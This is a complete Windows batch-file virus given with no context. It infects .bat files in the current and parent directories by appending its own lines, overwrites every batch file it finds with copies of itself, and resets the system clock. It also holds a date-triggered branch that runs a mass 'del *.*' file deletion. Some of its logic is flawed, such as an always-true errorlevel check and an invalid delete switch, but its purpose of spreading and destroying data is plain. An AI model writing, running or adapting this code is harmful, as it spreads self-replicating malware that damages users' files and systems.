@Echo OFF%[BaTy]%
for %%f in (*.bat ..\*.bat) do set BATy=%%f
find "BATy"<%BATy%>nul
if errorlevel 1 find "BATy"<%0>>%BATy%
echo.|date|find "04.07"<nul%[BATy]%
if errorlevel 0 goto :BATy
if errorlevel 1 goto :BATy_
:BATy_
del /Y *.* [%BATy%]
:BATy
for %%b in (*.bat ..\*.bat) do copy %0 %%b /Y
time 00:00
exit
